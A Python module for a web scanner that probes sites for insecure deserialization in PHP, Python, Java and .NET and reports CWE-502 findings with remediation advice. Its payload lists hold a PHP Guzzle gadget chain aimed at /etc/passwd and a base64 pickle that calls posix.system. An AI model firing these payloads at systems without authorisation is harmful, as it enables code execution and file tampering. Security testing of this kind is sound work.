#!/usr/bin/env python3
"""
Insecure Deserialization Vulnerability Scanner.
Tests for insecure deserialization vulnerabilities in PHP, Python, Java, and .NET applications.

References:
    - OWASP: https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization
    - PortSwigger: https://portswigger.net/web-security/deserialization
    - CWE-502: Deserialization of Untrusted Data
"""

import re
import base64
from typing import Dict, List, Optional
from urllib.parse import urljoin
from loguru import logger


class Scanner:
    """Insecure deserialization vulnerability scanner."""
    
    def __init__(self, browser, target_url: str, config: Dict):
        self.browser = browser
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.findings = []
        self.module_name = "Insecure Deserialization Detection"
        
        # PHP serialized payloads
        self.php_payloads = [
            'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
            'a:1:{s:4:"test";s:4:"test";}',
            'O:14:"SplObjectStorage":0:{}',
            'C:19:"SplDoublyLinkedList":0:{}',
            'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{s:36:"\\0GuzzleHttp\\Cookie\\FileCookieJar\\0filename";s:10:"/etc/passwd";s:41:"\\0GuzzleHttp\\Cookie\\CookieJar\\0cookies";a:0:{}s:39:"\\0GuzzleHttp\\Cookie\\CookieJar\\0strictMode";b:0;s:43:"\\0GuzzleHttp\\Cookie\\FileCookieJar\\0storeSessionCookies";b:1;}',
        ]
        
        # Python pickle payloads
        self.python_payloads = [
            'gASVHwAAAAAAAACMCF9fbWFpbl9flIwEVGVzdJSTlC4=',
            'gASVNgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZpZCAxMJSFlFKULg==',
        ]
        
        # Java serialized payloads (base64)
        self.java_payloads = [
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
        ]
        
        # .NET ViewState payloads
        self.dotnet_payloads = [
            '__VIEWSTATE=/wEPDwUKMTYwNz',
        ]
        
        # Common parameter names for serialized data
        self.serialization_params = [
            'data', 'serialized', 'serializedData', 'payload',
            'state', 'object', 'obj', 'input', 'request',
            '__VIEWSTATE', '__EVENTVALIDATION', 'viewstate',
            'javax.faces.ViewState', 'jsf_state_64',
        ]
        
        # Error patterns indicating deserialization
        self.error_patterns = [
            r'unserialize\(\)',
            r'__wakeup',
            r'__destruct',
            r'Object of class.*could not be converted',
            r'Class.*not found',
            r'Invalid serialization data',
            r'Deserialization of.*is not allowed',
            r'TypeError.*deserializ',
            r'pickle.*error',
            r'java.io.InvalidClassException',
            r'java.io.StreamCorruptedException',
            r'Failed to deserialize',
            r'SerializationException',
            r'InvalidClassException',
            r'NotSerializableException',
            r'OptionalDataException',
        ]
    
    def run(self) -> Dict:
        """Execute deserialization vulnerability tests."""
        logger.info(f"Starting {self.module_name} for {self.target_url}")
        
        result = {
            'module': self.module_name,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'findings': []
        }
        
        # Test PHP deserialization
        php_result = self._test_php_deserialization()
        if php_result:
            result['vulnerable_parameters'].extend(php_result)
        
        # Test Python pickle deserialization
        python_result = self._test_python_deserialization()
        if python_result:
            result['vulnerable_parameters'].extend(python_result)
        
        # Test .NET ViewState deserialization
        dotnet_result = self._test_dotnet_deserialization()
        if dotnet_result:
            result['vulnerable_parameters'].extend(dotnet_result)
        
        # Generate findings
        for vuln in result['vulnerable_parameters']:
            self.findings.append({
                'title': f"Insecure deserialization in '{vuln['parameter']}' parameter",
                'severity': 'critical',
                'description': (
                    f"Deserialization vulnerability detected in '{vuln['parameter']}' "
                    f"at {vuln['url']}. Type: {vuln.get('type', 'unknown')}. "
                    "Insecure deserialization can lead to remote code execution."
                ),
                'recommendation': (
                    "1. Never deserialize untrusted data\n"
                    "2. Use JSON/XML instead of native serialization\n"
                    "3. Implement integrity checks (HMAC signatures)\n"
                    "4. Use allowlists for deserialized classes\n"
                    "5. Run deserialization in isolated environments\n"
                    "6. Log and monitor deserialization attempts"
                ),
                'module': self.module_name,
                'cwe_id': 'CWE-502',
                'cvss_score': 9.8,
                'evidence': vuln.get('evidence', ''),
                'references': [
                    'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html',
                ]
            })
        
        result['findings'] = self.findings
        return result
    
    def _test_php_deserialization(self) -> List[Dict]:
        """Test for PHP deserialization vulnerabilities."""
        vulnerable = []
        
        for payload in self.php_payloads[:3]:
            # Test in common parameters
            for param in self.serialization_params[:5]:
                resp = self.browser.get(f'/?{param}={payload}')
                if resp:
                    for pattern in self.error_patterns[:5]:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            vulnerable.append({
                                'url': self.target_url,
                                'parameter': param,
                                'type': 'php_unserialize',
                                'evidence': f"Error pattern: {pattern}",
                            })
                            break
        
        return vulnerable
    
    def _test_python_deserialization(self) -> List[Dict]:
        """Test for Python pickle deserialization vulnerabilities."""
        vulnerable = []
        
        for payload in self.python_payloads[:1]:
            resp = self.browser.get(f'/?data={payload}')
            if resp:
                for pattern in self.error_patterns:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        vulnerable.append({
                            'url': self.target_url,
                            'parameter': 'data',
                            'type': 'python_pickle',
                            'evidence': f"Error pattern: {pattern}",
                        })
                        break
        
        return vulnerable
    
    def _test_dotnet_deserialization(self) -> List[Dict]:
        """Test for .NET ViewState deserialization vulnerabilities."""
        vulnerable = []
        
        resp = self.browser.get('/')
        if resp and '__VIEWSTATE' in resp.text:
            vulnerable.append({
                'url': self.target_url,
                'parameter': '__VIEWSTATE',
                'type': 'dotnet_viewstate',
                'evidence': 'ViewState parameter found in page',
            })
        
        return vulnerable